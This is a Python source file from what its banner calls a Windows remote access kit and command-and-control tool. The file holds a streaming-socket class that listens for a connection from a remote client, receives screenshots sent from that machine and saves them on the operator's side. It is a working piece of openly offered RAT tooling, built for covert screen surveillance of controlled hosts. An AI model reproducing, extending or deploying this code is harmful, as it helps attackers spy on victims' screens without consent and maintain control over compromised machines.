#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.22
# -------------------------------------------------------------
import socket
import struct
from core.networking.utils.IP_Handler import IPAddress
from core.utils.file_paths import DSFilePath
from core.logging.logging import LoggingUtilitys,NetworkingConfigs

BUFFER = 4096

class StreamingSocket:

    def __init__(self):
        self.local_ip = IPAddress().get_local_ip_from_interface()         #init local ip address
        self.port_number = NetworkingConfigs().retrieve_stream_port()     #init stream port number

    #Function will create a socket, accept the connection and return the client socket object
    def create_socket(self):
        self.stream_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #create socket
        self.stream_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)      #make reusable
        self.stream_socket.bind((self.local_ip,int(self.port_number)))              #bind socket to local ip and port
        self.stream_socket.listen(1)                                                #listen for connection
        conn, addr = self.stream_socket.accept()                                    #accept the connection
        return conn                                                                 #return the client socket object

    #Function will receive screenshot from client, write the photo to DS directory
    def recv_img_data(self):
        client_socket_obj = self.create_socket()                    #Create socket and get client socket object
        struct_length = client_socket_obj.recv(8)                   #Receive length of struct
        (length,) = struct.unpack(">Q",struct_length)               #Unpack the struct
        picture = b''                                               #Empty byte string
        while len(picture) < length:                                #while len picture is less than the len of the picture sent by client
            data_received = length - len(picture)                   #Data received is length of photo - whats been added to byte str
            if data_received > BUFFER:                              #if data received is greater than the buffer
                picture += client_socket_obj.recv(BUFFER)           #Photo is == Buffer size
            else:
                picture += client_socket_obj.recv(data_received)    #Add the rest of the data to the picture

            LoggingUtilitys().write_bytes_to_file(DSFilePath().streaming_frame,picture) #Write the bytes data to the streaming file
        self.stream_socket.close()                                      #Close the socket
